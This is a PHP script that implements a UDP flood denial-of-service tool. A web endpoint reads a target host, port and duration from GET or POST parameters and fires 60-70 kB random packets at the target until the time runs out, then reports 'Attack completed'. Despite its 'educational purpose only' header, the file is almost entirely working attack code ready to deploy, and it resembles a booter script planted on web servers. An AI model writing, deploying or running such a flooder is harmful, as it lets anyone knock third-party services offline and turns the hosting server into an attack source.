<?php

declare(strict_types=1);

namespace NetworkTools;

/**
 * Script to perform a DoS UDP Flood (Educational Purpose Only)
 *
 * @author c0re^ (original)
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
 *
 * This tool is written for educational purposes. Use responsibly and legally.
 */

// Set unlimited execution time
ini_set('max_execution_time', '0');
error_reporting(E_ERROR | E_WARNING);

/**
 * Exception for network-related errors
 */
class NetworkException extends \Exception {}

/**
 * Class for performing UDP DoS flood
 */
class UdpFlooder
{
    private const MIN_PACKET_SIZE = 61440; // 60 kB
    private const MAX_PACKET_SIZE = 71680; // 70 kB

    /**
     * UdpFlooder constructor
     */
    public function __construct(
        private string $host,
        private int $port,
        private int $durationSeconds,
        private bool $randomizePackets = false
    ) {
        $this->validateInputs();
    }

    /**
     * Validate constructor inputs
     *
     * @throws \InvalidArgumentException if inputs are invalid
     */
    private function validateInputs(): void
    {
        if (empty($this->host)) {
            throw new \InvalidArgumentException('Host cannot be empty');
        }

        if ($this->port < 1 || $this->port > 65535) {
            throw new \InvalidArgumentException('Port must be between 1 and 65535');
        }

        if ($this->durationSeconds < 1) {
            throw new \InvalidArgumentException('Duration must be at least 1 second');
        }
    }

    /**
     * Execute the UDP flood
     *
     * @throws NetworkException if socket connection fails
     */
    public function execute(): void
    {
        // Open socket connection
        $socket = @fsockopen("udp://{$this->host}", $this->port, $errorNumber, $errorMessage, 30);
        
        if (!$socket) {
            throw new NetworkException("Socket connection failed: $errorMessage");
        }

        try {
            // Generate packet data
            $packetSize = mt_rand(self::MIN_PACKET_SIZE, self::MAX_PACKET_SIZE);
            $packet = $this->generateRandomData($packetSize);
            
            // Send packets for the specified duration
            $endTime = time() + $this->durationSeconds;
            
            while (time() <= $endTime) {
                $packetData = $this->randomizePackets ? str_shuffle($packet) : $packet;
                @fwrite($socket, $packetData);
            }
        } finally {
            // Always ensure socket is closed
            @fclose($socket);
        }
    }

    /**
     * Generate random data for packets
     */
    private function generateRandomData(int $length): string
    {
        // Use cryptographically secure method if available
        if (function_exists('random_bytes')) {
            return bin2hex(random_bytes(intval($length / 2)));
        } elseif (function_exists('openssl_random_pseudo_bytes')) {
            return bin2hex(openssl_random_pseudo_bytes(intval($length / 2)));
        } else {
            // Fallback method
            return str_shuffle(substr(str_repeat(md5((string)mt_rand()), 2 + intval($length / 32)), 0, $length));
        }
    }
}

/**
 * Application controller
 */
class Application
{
    /**
     * Process request and execute UDP flood
     *
     * @param array<string, mixed> $params The request parameters
     * @return array<string, string> Response data as associative array
     */
    public static function process(array $params): array
    {
        if (empty($params)) {
            return ['status' => 'ok', 'message' => 'No parameters provided'];
        }

        if (!isset($params['host'])) {
            return ['status' => 'error', 'message' => 'Host parameter is required'];
        }

        try {
            $host = (string)$params['host'];
            $port = isset($params['port']) ? (int)$params['port'] : 80;
            $time = isset($params['time']) ? (int)$params['time'] : 60;
            $random = isset($params['random']) ? strtolower((string)$params['random']) === 'true' : false;

            $flooder = new UdpFlooder($host, $port, $time, $random);
            $flooder->execute();
            
            return ['status' => 'success', 'message' => 'Attack completed'];
        } catch (\InvalidArgumentException $e) {
            return ['status' => 'error', 'message' => 'Invalid parameter: ' . $e->getMessage()];
        } catch (NetworkException $e) {
            return ['status' => 'error', 'message' => 'Network error: ' . $e->getMessage()];
        } catch (\Exception $e) {
            return ['status' => 'error', 'message' => 'Unexpected error: ' . $e->getMessage()];
        }
    }
}

// Entry point - combine $_POST and $_GET parameters
$params = array_merge($_GET, $_POST);
$result = Application::process($params);
header('Content-Type: application/json');
echo json_encode($result);
